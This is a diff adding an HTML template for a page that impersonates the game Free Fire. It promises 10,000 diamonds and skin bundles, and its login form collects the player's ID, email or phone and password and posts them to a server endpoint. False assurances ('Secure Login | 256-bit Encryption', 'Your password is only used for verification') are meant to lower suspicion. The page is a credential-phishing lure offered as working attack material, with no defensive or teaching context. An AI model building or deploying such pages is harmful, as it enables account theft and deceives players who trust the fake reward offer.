@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Fire Login - Claim Rewards</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container login-container">
+        <div class="header">
+            <img src="/static/freefire-logo.png" alt="Free Fire" class="logo">
+            <h2><i class="fas fa-sign-in-alt"></i> LOGIN TO CLAIM REWARDS</h2>
+            <p>Verify your Free Fire account to receive diamonds</p>
+        </div>
+
+        <div class="login-box">
+            <div class="step-indicator">
+                <div class="step done">1. Select Rewards ✓</div>
+                <div class="step active">2. Login</div>
+                <div class="step">3. Verification</div>
+                <div class="step">4. Receive</div>
+            </div>
+
+            <form action="/authenticate" method="POST">
+                <div class="input-group">
+                    <i class="fas fa-gamepad"></i>
+                    <input type="text" name="game_id" placeholder="Free Fire ID / Email / Phone" required>
+                </div>
+                
+                <div class="input-group">
+                    <i class="fas fa-lock"></i>
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+
+                <button type="submit" class="login-btn">
+                    <i class="fas fa-unlock"></i> VERIFY & CONTINUE
+                </button>
+            </form>
+
+            <div class="security-note">
+                <p><i class="fas fa-shield-alt"></i> Secure Login | 256-bit Encryption</p>
+                <p><i class="fas fa-info-circle"></i> Your password is only used for verification</p>
+            </div>
+
+            <div class="rewards-preview">
+                <h4>You will receive:</h4>
+                <ul>
+                    <li>💎 10,000 Diamonds</li>
+                    <li>🌸 Sakura Bundle</li>
+                    <li>🎵 Hip Hop Bundle</li>
+                    <li>👕 Character Skin</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
